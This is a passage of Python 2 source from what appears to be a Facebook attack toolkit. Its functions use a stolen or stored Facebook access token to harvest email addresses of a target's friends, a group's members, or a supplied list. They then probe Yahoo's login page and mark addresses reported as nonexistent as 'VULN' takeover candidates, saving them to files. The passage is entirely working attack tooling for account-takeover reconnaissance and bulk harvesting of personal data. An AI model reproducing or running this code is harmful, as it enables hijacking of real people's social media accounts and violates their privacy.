	idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
	try:
		seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
		op = json.loads(seat.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;91m[!] Friend not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mGetting email from friend \033[1;97m...')
	friends = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
	kimak = json.loads(friends.text)
	save = open('out/FriendMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		fb_name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				click = br.submit().read()
				seat = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = seat.search(click).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+fb_name)
					sucessful.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FriendMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()

##### YAHOO MEMBER #####
def yahoomember():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+fb_token)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	jalan('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
	friends = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+fb_token)
	kimak = json.loads(friends.text)
	save = open('out/groupMailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
        print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		fb_name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				click = br.submit().read()
				seat = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = seat.search(click).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+fb_name)
					sucessful.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/groupMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()

##### YAHOO FILE #####
def yahoolist():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	files = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;91m[!] File not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_yahoo()
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;97m═"
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			click = br.submit().read()
			seat = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
			        pek = seat.search(click).group()
			except:
			        continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				save.write(mail + '\n')
				print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail)
				sucessful.append(mail)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()
	
	
if __name__=='__main__':
        tool_main_function()

